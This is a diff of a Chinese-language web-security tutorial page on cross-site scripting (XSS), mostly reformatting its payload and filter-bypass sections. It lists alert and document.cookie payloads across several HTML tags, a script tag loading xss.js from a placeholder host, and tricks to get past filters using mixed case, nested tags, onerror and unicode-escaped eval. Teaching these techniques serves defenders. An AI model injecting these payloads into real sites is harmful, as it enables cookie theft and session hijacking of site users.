-</code></pre></div><h2 id="5xss漏洞的挖掘">5.XSS漏洞的挖掘</h2>
+<h2 id="3xss-的攻击载荷">3.XSS 的攻击载荷</h2>
+<h3 id="script-标签">script 标签</h3>
+<pre tabindex="0"><code>&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   # 弹出 hack
+&lt;script&gt;alert(/hack/)&lt;/script&gt;   # 弹出 hack
+&lt;script&gt;alert(1)&lt;/script&gt;        # 弹出 1，对于数字可以不用引号
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;      # 弹出 cookie
+&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  # 引用外部的 xss
+</code></pre><h3 id="svg-标签">svg 标签</h3>
+<pre tabindex="0"><code>&lt;svg onload=&quot;alert(1)&quot;&gt;
+&lt;svg onload=&quot;alert(1)&quot;/&gt;
+</code></pre><h3 id="img-标签">img 标签</h3>
+<pre tabindex="0"><code>&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;
+&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  # 弹出cookie
+</code></pre><h3 id="body-标签">body 标签</h3>
+<pre tabindex="0"><code>&lt;body οnlοad=alert(1)&gt;
+&lt;body οnpageshοw=alert(1)&gt;
+</code></pre><h3 id="video-标签">video 标签</h3>
+<pre tabindex="0"><code>&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;
+</code></pre><h3 id="style-标签">style 标签</h3>
+<pre tabindex="0"><code>&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;
+</code></pre><h2 id="4xss-漏洞的挖掘">4.XSS 漏洞的挖掘</h2>
 <p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p>
 <ul>
 <li>URL的每一个参数</li>
@@ -305,24 +281,24 @@ script标签 &amp;lt;script&amp;gt;alert(&amp;#34;hack&amp;#34;)&amp;lt;/script&
 <li>针对型：站内信、网页即时通讯、私信、意见反馈</li>
 <li>存在风险：搜索框、当前目录、图片属性等</li>
 </ul>
-<h2 id="6xss的简单过滤和绕过">6.XSS的简单过滤和绕过</h2>
+<h2 id="5xss-的简单过滤和绕过">5.XSS 的简单过滤和绕过</h2>
 <h3 id="a区分大小写过滤标签">a.区分大小写过滤标签</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- 可以使用大小写绕过--&gt;</span>
-&lt;<span style="color:#f92672">scripT</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;hack&#39;</span>)&lt;/<span style="color:#f92672">scripT</span>&gt;
-&lt;<span style="color:#f92672">sCript</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;hey!&#34;</span>)&lt;/<span style="color:#f92672">scRipt</span>&gt;
-</code></pre></div><h3 id="b不区分大小写过滤标签">b.不区分大小写过滤标签</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- 可以使用嵌套的script标签绕过 --&gt;</span> 
-&lt;<span style="color:#f92672">scr</span><span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">script</span>&gt;ipt&gt;alert(&#39;hack&#39;)<span style="color:#960050;background-color:#1e0010">&lt;</span>/scr&lt;/<span style="color:#f92672">script</span>&gt;ipt&gt;
-</code></pre></div><h3 id="c不区分大小写过滤之间的所有内容">c.不区分大小写，过滤之间的所有内容</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- 虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。onerror事件是专门针对js出错的，标签闭合性被破坏会触发这个事件。--&gt;</span> 
- &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span> <span style="color:#a6e22e">οnerrοr</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(&#39;hack&#39;)</span>&gt;
-</code></pre></div><h3 id="d编码脚本代码绕过关键字过滤">d.编码脚本代码绕过关键字过滤</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- 有的时候，服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval（）来实现。eval()会将编码过的语句解码后再执行，简直太贴心了。例如alert(1)编码过后就是 \u0061\u006c\u0065\u0072\u0074(1)--&gt;</span> 
-&lt;<span style="color:#f92672">script</span>&gt;eval(<span style="color:#a6e22e">\u0061\u006c\u0065\u0072\u0074</span>(<span style="color:#ae81ff">1</span>))&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><h3 id="e主动闭合标签实现注入代码">e.主动闭合标签实现注入代码</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- 有些注入点出现在链接或属性中，此时可以使用&#34;主动的闭合标签，实现代码的注入--&gt;</span>
-&#34;;alert(&#34;I am coming again~&#34;);&#34;
-</code></pre></div>
+<p>可以使用大小写绕过</p>
+<pre tabindex="0"><code>&lt;scripT&gt;alert('hack')&lt;/scripT&gt;
+&lt;sCript&gt;alert(&quot;hey!&quot;)&lt;/scRipt&gt;
+</code></pre><h3 id="b不区分大小写过滤标签">b.不区分大小写过滤标签</h3>
+<p>可以使用嵌套的 script 标签绕过</p>
+<pre tabindex="0"><code>&lt;scr&lt;script&gt;ipt&gt;alert('hack')&lt;/scr&lt;/script&gt;ipt&gt;
+</code></pre><h3 id="c不区分大小写过滤之间的所有内容">c.不区分大小写，过滤之间的所有内容</h3>
+<p>可以通过 img、body 等标签的 onerror 事件或者 iframe 等标签的 src 注入恶意的 JavaScript 代码。onerror 事件是专门针对 js 出错的，标签闭合性被破坏会触发这个事件。</p>
+<pre tabindex="0"><code>&lt;img src=1 οnerrοr=alert('hack')&gt;
+</code></pre><h3 id="d编码脚本代码绕过关键字过滤">d.编码脚本代码绕过关键字过滤</h3>
+<p>有的时候，服务器往往会对代码中的关键字（ 如 alert ）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入。我们可以用 eval() 将编码过的语句解码后再执行。例如：<code>alert(1) = eval(\u0061\u006c\u0065\u0072\u0074(1))</code></p>
+<pre tabindex="0"><code>&lt;script&gt;eval(\u0061\u006c\u0065\u0072\u0074(1))&lt;/script&gt;
+</code></pre><h3 id="e主动闭合标签实现注入代码">e.主动闭合标签实现注入代码</h3>
+<p>有些注入点出现在链接或属性中，此时可以使用<code>&quot;</code>主动的闭合标签，实现代码的注入</p>
+<pre tabindex="0"><code>&quot;;alert(&quot;I am coming again~&quot;);&quot;
+</code></pre>
 </section>
 
 
